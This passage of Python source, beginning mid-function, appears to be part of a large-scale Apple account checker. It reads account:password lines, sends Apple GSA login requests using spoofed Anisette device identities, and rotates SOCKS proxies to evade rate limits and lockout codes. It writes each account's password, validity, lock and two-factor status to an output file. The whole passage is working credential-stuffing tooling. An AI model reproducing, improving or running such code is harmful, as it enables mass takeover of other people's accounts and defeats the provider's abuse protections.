            request_started = time.monotonic() if debug_enabled else None
            attempt_started = time.time()
            try:
                if identity is None:
                    identity_lock = (worker_state.get('identity_lock')
                                     if worker_state is not None else threading.RLock())
                    with identity_lock:
                        # Another thread bound to this device may have completed
                        # the on-demand public-header request while we waited.
                        identity = (worker_state.get('identity')
                                    if worker_state is not None else identity)
                        if identity is None:
                            inspected = pool.inspect(slot_id)
                            ready = inspected['state'] == 'ready'
                            header_failures = 0
                            header_error = None
                            while (identity is None and not stop.is_set()
                                   and header_failures <= retries):
                                try:
                                    identity, info, profile = fetch_persistent_identity(
                                        slot_id, worker_state,
                                        registered=ready,
                                        account_proxy=account_proxy)
                                except Exception as exc:           # noqa: BLE001
                                    header_error = exc
                                    header_failures += 1
                                    if (header_failures <= retries
                                            and warmup_retry_delay):
                                        stop.wait(warmup_retry_delay)
                            if identity is None:
                                if proxy_pool is not None and lease is not None:
                                    discard = getattr(proxy_pool, 'discard', None)
                                    if callable(discard):
                                        discard(lease)
                                    else:
                                        proxy_pool.release(lease, healthy=False)
                                    if (runtime_proxy_pool
                                            and getattr(thread_state, 'proxy_lease', None) is lease):
                                        thread_state.proxy_lease = None
                                        thread_state.proxy_lease_uses = 0
                                    lease = None
                                if header_error is not None:
                                    raise RuntimeError(
                                        f'设备 {slot_id} 公共头获取失败: {header_error}') from header_error
                                raise InterruptedError('节点关闭时公共头尚未就绪')
                            if worker_state is not None:
                                worker_state['info'] = info
                                worker_state['identity'] = identity
                                worker_state['device_label'] = _device_id_label(
                                    pool.inspect(slot_id).get('device_id') or
                                    inspected.get('device_id'))
                                device_labels[slot_id] = worker_state['device_label']
                            if not ready and pool.inspect(slot_id)['state'] == 'ready':
                                record_device_registration(
                                    device_root, slot_id, REGISTRATION_EXIT_IP_SKIPPED,
                                    profile.get('model', ''))
                # 与并发3一致：设备/公共头准备不消耗账号时限。
                # 只有真正要发 GSA 请求时才开始 25 秒计时。
                if account_started is None:
                    account_started = time.time()
                attempt_timeout = _gsa_per_hop_timeout(timeout, timeout)
                if (worker_state is not None and start_attempt == 0 and attempt == 0):
                    worker_state['identity_uses'] = int(worker_state.get('identity_uses') or 0) + 1
                # 每次协议请求使用当前线程自己的出口。
                result = gsa_check(account, password, account_proxy,
                                   timeout=attempt_timeout,
                                   retries=0 if proxy_pool is not None else retries,
                                   cancel=stop.is_set, identity=identity)
                if descriptor.get('_web_secondary_auth'):
                    def rotate_web(web_attempt):
                        nonlocal account_proxy, lease, current_proxy
                        if proxy_pool is not None:
                            if lease is not None:
                                proxy_pool.discard(lease)
                                lease = None
                            account_proxy, lease = proxy_for(index + attempt + web_attempt)
                            current_proxy = (_proxy_identity(account_proxy)
                                             if debug_enabled else current_proxy)
                            return account_proxy, account_proxy is not None
                        return account_proxy, False

                    if proxy_pool is not None:
                        result = _refine_repair_auth_with_rotation(
                            result, account, password, account_proxy, attempt_timeout,
                            stop.is_set, retries, rotate_web,
                            deadline=attempt_started + attempt_timeout)
                    else:
                        result = _refine_repair_auth(
                            result, account, password, account_proxy, attempt_timeout,
                            stop.is_set, retries=retries)
            except Exception as exc:                               # noqa: BLE001
                # Public-header preparation happens before this account's
                # clock starts.  A failure here is a worker/setup failure, not
                # an account timeout/result.
                if account_started is None:
                    raise
                result = {'status': 'error', 'kind': type(exc).__name__, 'http': 0,
                          'stage': 'init', 'detail': str(exc)[:180]}
            request_ms = (round((time.monotonic() - request_started) * 1000, 2)
                          if debug_enabled else None)
            attempt_elapsed = time.time() - attempt_started
            attempt_timed_out = attempt_elapsed >= attempt_timeout
            if attempt_timed_out:
                # A verdict arriving after its per-attempt deadline is stale.
                # Drop the current SOCKS route and use the next configured
                # retry on a fresh exit.  There is no separate total budget.
                result = {'status': 'error', 'kind': 'timeout', 'http': 0,
                          'stage': 'attempt_deadline',
                          'detail': f'单次验证超过 {attempt_timeout:g} 秒',
                          '_proxy_retries': attempt,
                          '_attempt_timed_out': True}
            transport_failed = retryable_transport(result)
            try:
                result_http = int(result.get('http'))
            except (TypeError, ValueError):
                result_http = None
            try:
                apple_ec = int(result.get('apple_ec'))
            except (TypeError, ValueError):
                apple_ec = None
            try:
                web_http = int(result.get('web_http'))
            except (TypeError, ValueError):
                web_http = None
            web_failed = (str(result.get('web_status') or '').casefold() == 'error'
                          and web_http in (0, 500, 502, 503, 504))
            # HTTP 0 and transient 5xx are retry outcomes: remove that exact lease now,
            # wait five seconds, then acquire an available (never in-use) exit.
            # Proxy-auth 407 and other transport failures retain the general
            # three-strike policy used outside this retry branch.
            # 明确重试条件都淘汰当前出口，等待 5 秒后从池中获取
            # 另一条 IP；否则刚释放的健康租约可能被同一账号再次拿到。
            immediate_discard = (result_http in (0, 503) or web_failed
                                 or apple_ec in (-22410, -332000, -33200, -3000303)
                                 or retryable_20970(result)
                                 or apple_retry_later(result))
            healthy_exit = result_http not in (None, 0, 407) and not web_failed
            if proxy_pool is not None and lease is not None:
                if immediate_discard:
                    proxy_pool.discard(lease)
                    if (runtime_proxy_pool
                            and getattr(thread_state, 'proxy_lease', None) is lease):
                        thread_state.proxy_lease = None
                        thread_state.proxy_lease_uses = 0
                elif runtime_proxy_pool and healthy_exit:
                    # Keep one proven SOCKS/TLS route local to this worker
                    # until TTL.  Releasing it after every account forced a
                    # new tunnel and discarded connection pooling.
                    pass
                else:
                    proxy_pool.release(lease, healthy=healthy_exit)
                    if (runtime_proxy_pool
                            and getattr(thread_state, 'proxy_lease', None) is lease):
                        thread_state.proxy_lease = None
                        thread_state.proxy_lease_uses = 0
            elif worker_state is not None and transport_failed:
                # No global pool: only this worker forgets its failed endpoint.
                # Its next retry obtains exactly one replacement directly.
                worker_state['proxy'] = None
            if debug_enabled and (web_failed or int(result.get('web_attempts') or 0) > 1):
                _write_proxy_debug(
                    debug_path, 'web_retry_result', row=row, slot=slot_id,
                    web_http=web_http,
                    web_status=str(result.get('web_status') or ''),
                    web_attempts=int(result.get('web_attempts') or 0),
                    web_proxy_rotations=int(result.get('web_proxy_rotations') or 0),
                    web_rotation_exhausted=bool(result.get('web_rotation_exhausted')),
                    last_endpoint=current_proxy['endpoint'],
                    release=('discarded' if immediate_discard else 'reusable'),
                    pool=_proxy_pool_snapshot(proxy_pool))
            if debug_enabled and transport_failed:
                debug_event = 'timeout_attempt'
                exit_ip_debug.submit(
                    account_proxy, debug_event, row=row, slot=slot_id,
                    attempt=attempt, attempt_limit=attempt_limit,
                    previous_endpoint=previous_proxy['endpoint'],
                    port_changed=switch['port_changed'],
                    pair_changed=switch['pair_changed'])
                _write_proxy_debug(
                    debug_path, debug_event,
                    row=row, slot=slot_id, attempt=attempt, attempt_limit=attempt_limit,
                    request_sent=True, acquire_ms=acquire_ms, request_ms=request_ms,
                    endpoint=current_proxy['endpoint'], host=current_proxy['host'],
                    port=current_proxy['port'], **switch, http=result_http,
                    status=str(result.get('status') or ''), kind=str(result.get('kind') or ''),
                    stage=str(result.get('stage') or ''),
                    detail=_proxy_debug_detail(result.get('detail')),
                    retryable=transport_failed,
                    lease_reused=bool(lease and int(lease[2]) > 0),
                    release=('discarded' if immediate_discard else
                             ('reusable' if healthy_exit else 'failure_recorded')),
                    pool_before=acquire_before, pool_after=_proxy_pool_snapshot(proxy_pool))
            if apple_ec in (-22421, -22410, -332000, -33200, -3000303):
                # 这不是账号结论；下一次重新获取 Anisette 身份，避免用
                # 同一份无效设备认证数据重复请求。
                identity = None
                if worker_state is not None:
                    worker_state['identity'] = None
            previous_proxy = current_proxy
            if not transport_failed or attempt + 1 >= attempt_limit:
                result['_proxy_retries'] = attempt
                break
            # Return this account to the coordinator's delayed retry heap.
            # No worker thread sleeps during the five-second backoff.
            result.update(_retry_at=time.monotonic() + retry_delay,
                          _retry_attempt=attempt + 1,
                          _retry_started=account_started,
                          _retry_identity=identity,
                          _retry_previous=current_proxy,
                          _retry_force_proxy=True)
            return row, line, result
        if result is None:
            result = {'status': 'error', 'kind': 'proxy', 'http': 0,
                      'stage': 'init', 'detail': '线程未获取代理结果', '_proxy_retries': 0}
        result['elapsed'] = round(
            0.0 if account_started is None else time.time() - account_started, 2)
        result['slot'] = slot_id
        result['device_key'] = account_prefix
        mark_device_used(slot_id)
        reason_key = _apple_reason_key(result, auth_result_bucket(result))
        if debug_enabled:
            _write_proxy_debug(
                debug_path, 'final_result', row=row, slot=slot_id,
                status=auth_result_bucket(result), http=result.get('http'),
                code=result.get('apple_ec'), reason_key=reason_key,
                apple_message=_proxy_debug_detail(result.get('apple_message')),
                detail=_proxy_debug_detail(result.get('detail')))
        if debug_enabled and (auth_result_bucket(result) == 'timeout'
                              or (str(result.get('web_status') or '').casefold() == 'error'
                                  and result.get('web_http') in (0, 500, 502, 503, 504))):
            _write_proxy_debug(
                debug_path, 'final_timeout', row=row, slot=slot_id,
                recorded_retries=int(result.get('_proxy_retries') or 0),
                configured_retries=retries, http=result.get('http'),
                kind=str(result.get('kind') or ''), stage=str(result.get('stage') or ''),
                detail=_proxy_debug_detail(result.get('detail')),
                last_endpoint=previous_proxy['endpoint'],
                pool=_proxy_pool_snapshot(proxy_pool))
        return row, line, result

    def one(row, index, line, start_attempt=0, account_started=None,
            identity_override=identity_default, previous_proxy=None,
            force_proxy=False):
        # Only this short in-memory checkout touches the allocator lock. Header
        # creation and the Apple request happen after it has been released.
        device_state = (getattr(thread_state, 'bound_device', None)
                        if bind_device_to_thread else None)
        if device_state is None:
            device_state = device_allocator.acquire(stop)
            if bind_device_to_thread and device_state is not None:
                # Keep Apple identity, SOCKS route and HTTP session on the same
                # worker.  Swapping devices between accounts while retaining a
                # thread-local requests.Session destroyed the proven affinity
                # and caused otherwise healthy exits to stall.
                thread_state.bound_device = device_state
        if device_state is None:
            return row, line, {'status': 'unknown', 'kind': 'stopped'}
        thread_state.value = device_state
        try:
            stagger_first_account()
            outcome = _one_with_borrowed_device(
                row, index, line, start_attempt, account_started,
                identity_override, previous_proxy, force_proxy)
            # 并发3 performs transport retries inside the same worker.  Keeping
            # the retry here preserves the thread-owned device, public header,
            # proxy lease and requests.Session instead of returning the account
            # to the global executor where another thread may pick it up.
            while outcome[2].get('_retry_at') is not None and not stop.is_set():
                retry = outcome[2]
                retry.pop('_retry_at', None)
                outcome = _one_with_borrowed_device(
                    row, index, line,
                    int(retry.pop('_retry_attempt')),
                    retry.pop('_retry_started'),
                    retry.pop('_retry_identity'),
                    retry.pop('_retry_previous'),
                    bool(retry.pop('_retry_force_proxy', False)))
            return outcome
        finally:
            thread_state.value = None
            if not bind_device_to_thread:
                device_allocator.release(device_state)

    stop_flag = stop
    startup_ramp = max(0.0, float(descriptor.get(
        '_account_start_ramp', ACCOUNT_START_RAMP_SECONDS if workers >= 100 else 0.0)))
    startup_epoch = time.monotonic()
    startup_lock = threading.Lock()
    startup_order = 0

    def stagger_first_account():
        """Avoid a synchronized SOCKS/TLS burst after the warmup barrier."""
        nonlocal startup_order
        if getattr(thread_state, 'account_started', False):
            return
        thread_state.account_started = True
        if not startup_ramp or workers <= 1:
            return
        with startup_lock:
            order = startup_order
            startup_order += 1
        target = startup_epoch + startup_ramp * min(order, workers - 1) / workers
        delay = target - time.monotonic()
        if delay > 0:
            stop_flag.wait(delay)

    def prepare_persistent_thread(worker_index):
        """Bind one device/route/header before this worker may take an account."""
        device_state = device_allocator.acquire(stop_flag)
        if device_state is None:
            raise InterruptedError('租约失效或节点关闭')
        thread_state.bound_device = device_state
        thread_state.value = device_state
        slot_id = int(device_state['slot'])
        lease = None
        try:
            account_proxy, lease = proxy_for(worker_index)
            if descriptor.get('proxy_api') and not account_proxy:
                raise RuntimeError('工作线程未能获取代理出口')
            inspected = pool.inspect(slot_id)
            ready = inspected['state'] == 'ready'
            identity = None
            last_error = None
            for attempt in range(retries + 1):
                if stop_flag.is_set():
                    raise InterruptedError('租约失效或节点关闭')
                try:
                    identity, info, profile = fetch_persistent_identity(
                        slot_id, device_state, registered=ready,
                        account_proxy=account_proxy)
                    break
                except Exception as exc:                            # noqa: BLE001
                    last_error = exc
                    if attempt < retries and warmup_retry_delay:
                        stop_flag.wait(warmup_retry_delay)
            if identity is None:
                raise RuntimeError(
                    f'设备 {slot_id} 公共头获取失败: '
                    f'{type(last_error).__name__}: {last_error}')
            refreshed = pool.inspect(slot_id)
            label = (_device_id_label(refreshed.get('device_id')) or
                     _device_id_label(inspected.get('device_id')))
            with device_state['identity_lock']:
                device_state.update(info=info, identity=identity,
                                    identity_uses=0, device_label=label)
            infos[slot_id] = info
            identities[slot_id] = identity
            device_labels[slot_id] = label
            if not ready and refreshed['state'] == 'ready':
                record_device_registration(
                    device_root, slot_id, REGISTRATION_EXIT_IP_SKIPPED,
                    profile.get('model', ''))
            # ``proxy_for`` reserves the route for the thread.  Header setup is
            # not an account, so the first real task must still be use #1.
            if runtime_proxy_pool:
                thread_state.proxy_lease_uses = 0
            return device_state
        except Exception:
            close_persistent_anisette_client(device_state)
            if proxy_pool is not None and lease is not None:
                discard = getattr(proxy_pool, 'discard', None)
                if callable(discard):
                    discard(lease)
                else:
                    proxy_pool.release(lease, healthy=False)
            thread_state.proxy_lease = None
            thread_state.proxy_lease_uses = 0
            thread_state.bound_device = None
            thread_state.value = None
            device_allocator.release(device_state)
            raise

    def release_persistent_thread(device_state):
        lease = getattr(thread_state, 'proxy_lease', None)
        if proxy_pool is not None and lease is not None:
            proxy_pool.release(lease, healthy=True)
        thread_state.proxy_lease = None
        thread_state.proxy_lease_uses = 0
        try:
            from fastcheck.protocols import gsa_status
            gsa_status.close_session()
        except Exception:                                           # noqa: BLE001
            pass
        close_persistent_anisette_client(device_state)
        thread_state.bound_device = None
        thread_state.value = None
        if device_state is not None:
            device_allocator.release(device_state)

    output_digest = hashlib.sha256()
    with (directory / 'input.part').open('r', encoding='utf-8', errors='replace') as source, output_path.open('wb') as output:
        output_path.chmod(0o600)
        first_row = int(descriptor.get('first_row') or 1)

        def persist_result(row, line, result):
            nonlocal processed, last_progress
            status = auth_result_bucket(result)
            counters[status] += 1
            processed += 1
            raw_line = line.encode('utf-8')
            account, password = _split_account(line)
            device = result.get('slot') or slot_ids[(row - first_row) % len(slot_ids)]
            business_code = result.get('apple_ec')
            if business_code is None:
                business_code = (result.get('detail') or result.get('kind') or '')[:180]
            reason = _apple_reason_for_record(result, status, detailed_error_enabled)
            record = {'row': row, 'account': account, 'password': password, 'status': status,
                      'sha256': hashlib.sha256(raw_line).hexdigest(), 'bytes': len(raw_line),
                      'stage': result.get('stage') or '', 'http': result.get('http'),
                      'code': str(business_code)[:180], 'reason': reason,
                      'protocol': 'GSA', 'device': device,
                      'device_key': result.get('device_key') or '',
                      'device_label': device_labels.get(device, ''),
                      'elapsed': result.get('elapsed'),
                      'attempts': max(
                          int(result.get('_proxy_retries') or 0),
                          max(0, int(result.get('web_attempts') or 0) - 1))}
            # The bounded reason key is part of the result contract, not debug
            # data.  Always keep it so the controller can distinguish an
            # explicit lock from an unlabeled -20970 without storing Apple's
            # verbose text.  Only ``reason`` remains opt-in above.
            reason_key = _apple_reason_key(result, status)
            if reason_key:
                record['reason_key'] = reason_key
            for key in ('two_factor_method', 'web_auth_type', 'web_http',
                        'web_status', 'web_stage', 'web_kind', 'web_detail',
                        'web_attempts', 'web_server', 'web_via',
                        'web_retry_after', 'web_content_type',
                        'web_response_bytes', 'web_response_sha256',
                        'web_response_keys', 'web_service_error_codes',
                        'web_has_session_headers', 'web_has_set_cookie',
                        'web_proxy_rotations', 'web_rotation_exhausted'):
                if result.get(key) not in (None, ''):
                    record[key] = result[key]
            encoded = (json.dumps(record, separators=(',', ':')) + '\n').encode()
            output.write(encoded)
            output_digest.update(encoded)
            now = time.monotonic()
            if now - last_progress >= 0.25:
                output.flush()
                atomic_json(directory / 'progress.json',
                            {'processed': processed, 'started': started,
                             'counts': dict(counters)})
                last_progress = now

        if runtime_proxy_pool:
            # 并发3 model: workers live for the whole package.  Each one owns
            # a device, proxy lease and GSA thread-local session, obtains public
            # headers first, and only then pops an account from the shared deque.
            work_items = deque()
            for index, line in enumerate(source):
                work_items.append((first_row + index, index, line.rstrip('\r\n')))
            expected = len(work_items)
            work_lock = threading.Lock()
            result_queue = queue.Queue()
            worker_errors = []
            worker_error_lock = threading.Lock()

            def take_work():
                with work_lock:
                    return work_items.popleft() if work_items else None

            def return_work(work):
                with work_lock:
                    work_items.appendleft(work)

            def persistent_worker(worker_index):
                device_state = None
                current = None
                try:
                    device_state = prepare_persistent_thread(worker_index)
                    while not stop_flag.is_set():
                        current = take_work()
                        if current is None:
                            return
                        try:
                            outcome = one(*current)
                        except Exception as exc:                    # noqa: BLE001
                            return_work(current)
                            with worker_error_lock:
                                worker_errors.append(exc)
                            return
                        result_queue.put(outcome)
                        current = None
                except Exception as exc:                            # noqa: BLE001
                    with worker_error_lock:
                        worker_errors.append(exc)
                finally:
                    release_persistent_thread(device_state)

            active_workers = min(workers, len(device_states), max(1, expected))
            with ThreadPoolExecutor(max_workers=active_workers,
                                    thread_name_prefix='auth-worker') as workers_pool:
                worker_futures = [workers_pool.submit(persistent_worker, index)
                                  for index in range(active_workers)]
                while processed < expected:
                    if stop_flag.is_set():
                        raise InterruptedError('租约失效或节点关闭')
                    try:
                        row, line, result = result_queue.get(timeout=0.25)
                    except queue.Empty:
                        if all(future.done() for future in worker_futures):
                            with worker_error_lock:
                                error = worker_errors[0] if worker_errors else None
                            if error is not None:
                                raise RuntimeError(
                                    f'工作线程已全部退出: {type(error).__name__}: {error}')
                            break
                        continue
                    persist_result(row, line, result)
                for future in worker_futures:
                    future.result()
        else:
            # Test/injected pools keep the bounded future coordinator used by
            # earlier releases; production always takes the persistent path.
            with ThreadPoolExecutor(max_workers=workers,
                                    thread_name_prefix='auth-worker') as workers_pool:
                pending = set()
                ready = deque()
                delayed = []
                retry_order = 0
                index = 0
                exhausted = False
                while not exhausted or pending or ready or delayed:
                    if stop_flag.is_set():
                        raise InterruptedError('租约失效或节点关闭')
                    now = time.monotonic()
                    while delayed and delayed[0][0] <= now:
                        _at, _order, work = heapq.heappop(delayed)
                        ready.append(work)
                    while len(pending) < workers * 2:
                        if ready:
                            work = ready.popleft()
                        elif not exhausted:
                            line = source.readline()
                            if line == '':
                                exhausted = True
                                continue
                            line = line.rstrip('\r\n')
                            work = (first_row + index, index, line)
                            index += 1
                        else:
                            break
                        pending.add(workers_pool.submit(one, *work))
                    if not pending:
                        if delayed:
                            stop_flag.wait(min(0.05, max(0.0, delayed[0][0] -
                                                         time.monotonic())))
                        continue
                    wait_timeout = 0.25
                    if delayed:
                        wait_timeout = min(wait_timeout, max(0.0, delayed[0][0] -
                                                             time.monotonic()))
                    finished, _unfinished = wait(pending, timeout=wait_timeout,
                                                 return_when=FIRST_COMPLETED)
                    if not finished:
                        continue
                    future = finished.pop()
                    pending.remove(future)
                    row, line, result = future.result()
                    retry_at = result.pop('_retry_at', None)
                    if retry_at is not None:
                        work = (row, row - first_row, line,
                                int(result.pop('_retry_attempt')),
                                result.pop('_retry_started'),
                                result.pop('_retry_identity'),
                                result.pop('_retry_previous'),
                                bool(result.pop('_retry_force_proxy', False)))
                        retry_order += 1
                        heapq.heappush(delayed, (float(retry_at), retry_order, work))
                        continue
                    persist_result(row, line, result)

    if processed != int(descriptor.get('rows') or 0):
        raise ValueError('输入条数和工作包描述不一致')
    if usage_resets:
        _bump_usage(device_root, usage_counts, usage_resets)
    else:
        _bump_usage(device_root, usage_counts)
    atomic_json(directory / 'progress.json',
                {'processed': processed, 'started': started,
                 'counts': dict(counters)})
    if runtime_proxy_pool and hasattr(proxy_pool, 'stop'):
        proxy_pool.stop()
    atomic_json(directory / 'done.json',
                {'ok': True, 'processed': processed, 'counts': dict(counters),
                 'checksum': output_digest.hexdigest(),
                 'elapsed': time.time() - started})
    if debug_enabled:
        exit_ip_debug.close()
        _write_proxy_debug(debug_path, 'worker_stop', ok=True, processed=processed,
                           counts=dict(counters), pool=_proxy_pool_snapshot(proxy_pool),
                           devices=device_allocator.snapshot(),
                           exit_ip_probe=exit_ip_debug.snapshot())
